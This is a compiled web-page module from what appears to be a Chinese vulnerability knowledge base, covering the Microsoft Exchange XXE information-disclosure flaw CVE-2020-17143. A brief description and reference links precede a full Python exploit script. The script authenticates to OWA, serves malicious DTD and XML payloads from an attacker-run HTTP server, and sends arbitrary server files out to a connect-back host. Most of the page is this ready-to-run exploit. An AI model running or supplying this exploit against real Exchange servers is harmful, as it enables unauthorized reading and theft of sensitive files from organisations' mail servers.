import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as e,c,a as n,b as s,d as t,e as u}from"./app-58e4a7d6.js";const l={},i=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"此漏洞使远程攻击者可以披露有关受影响的Exchange Server安装的信息。利用身份验证才能利用此漏洞。",-1),k=n("p",null,"特定缺陷存在于GetWacIframeUrlForOneDrive服务命令的处理中。造成此问题的原因是缺乏对用户提供的xml的正确验证。攻击者可以利用此漏洞在SYSTEM上下文中披露信息。",-1),d={href:"//portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17143",target:"_blank",rel:"noopener noreferrer"},v=n("p",null,"参考链接：",-1),m={href:"https://nvd.nist.gov/vuln/detail/CVE-2020-17143",target:"_blank",rel:"noopener noreferrer"},b={href:"https://srcincite.io/advisories/src-2020-0030/",target:"_blank",rel:"noopener noreferrer"},g=u(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>exp：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread
<span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> BaseHTTPRequestHandler<span class="token punctuation">,</span> HTTPServer
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">xxe</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">log_message</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span>
    <span class="token keyword">def</span> <span class="token function">_set_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">&#39;Content-type&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;application/xml&#39;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">&#39;Content-Length&#39;</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">&quot;leaked&quot;</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>path<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) stolen: %s&quot;</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
            message <span class="token operator">=</span> <span class="token string">&quot;&lt;![CDATA[ &lt;![ INCLUDE[]]&gt; ]]&gt;&quot;</span>
            self<span class="token punctuation">.</span>_set_response<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">&quot;poc.dtd&quot;</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>path<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) triggered xxe in exchange server!&quot;</span><span class="token punctuation">)</span>
            message <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
&lt;!ENTITY %% payload &quot;%%start;%%stuff;%%end;&quot;&gt;
&lt;!ENTITY %% param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;http://%s:%d/leaked?%%payload;&quot;&gt;&#39;&gt;
%%param1; %%external;&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_set_response<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">&quot;poc.xml&quot;</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>path<span class="token punctuation">:</span>
            d <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
 &lt;!ENTITY %% start &quot;&lt;![CDATA[&quot;&gt;
 &lt;!ENTITY %% stuff SYSTEM &quot;file:///%s&quot;&gt;
&lt;!ENTITY %% end &quot;]]&gt;&quot;&gt;
&lt;!ENTITY %% dtd SYSTEM &quot;http://%s:%d/poc.dtd&quot;&gt;
%%dtd;
]&gt;&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_set_response<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>d<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> pwd<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    server <span class="token operator">=</span> HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> xxe<span class="token punctuation">)</span>
    handlerthr <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    handlerthr<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
    handlerthr<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;destination&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;https://%s/owa&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span>
        <span class="token string">&quot;flags&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;username&quot;</span> <span class="token punctuation">:</span> usr<span class="token punctuation">,</span>
        <span class="token string">&quot;password&quot;</span> <span class="token punctuation">:</span> pwd
    <span class="token punctuation">}</span>
    s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;https://%s/owa/auth.owa&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    h <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;X-OWA-UrlPostData&quot;</span> <span class="token punctuation">:</span> <span class="token string">&#39;{&quot;request&quot;:{&quot;DocumentUrl&quot;:&quot;&quot;,&quot;EndPointUrl&quot;:&quot;http://%s:%d/poc.xml&quot;}}&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Action&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;GetWacIframeUrlForOneDrive&quot;</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;https://%s/owa/service.svc&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">&#39;X-OWA-CANARY&#39;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) couldn&#39;t leak the csrf canary!&quot;</span> 
    h<span class="token punctuation">[</span><span class="token string">&quot;X-OWA-CANARY&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">&#39;X-OWA-CANARY&#39;</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;https://%s/owa/service.svc&quot;</span> <span class="token operator">%</span> t<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;connectback ip:port&gt; &lt;file&gt;&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;(+) eg: %s 192.168.75.142 harryh@exchangedemo.com:user123# 192.168.75.1:9090 \\&quot;C:/Users/harryh/secrets.txt\\&quot;&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    trgt <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">assert</span> <span class="token string">&quot;:&quot;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) you need a user and password!&quot;</span>
    usr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    pwd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    port <span class="token operator">=</span> <span class="token number">9090</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">&quot;:&quot;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span> 
        host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">assert</span> port<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;(-) not a port number!&quot;</span>
    main<span class="token punctuation">(</span>trgt<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> pwd<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3);function q(f,h){const a=o("ExternalLinkIcon");return e(),c("div",null,[i,r,k,n("p",null,[s("Microsoft已发布更新来纠正此漏洞。可以在以下位置找到更多详细信息：https : "),n("a",d,[s("//portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17143"),t(a)])]),v,n("ul",null,[n("li",null,[n("a",m,[s("https://nvd.nist.gov/vuln/detail/CVE-2020-17143"),t(a)])]),n("li",null,[n("a",b,[s("https://srcincite.io/advisories/src-2020-0030/"),t(a)])])]),g])}const w=p(l,[["render",q],["__file","Microsoft Exchange 信息泄露漏洞 CVE-2020-17143.html.vue"]]);export{w as default};
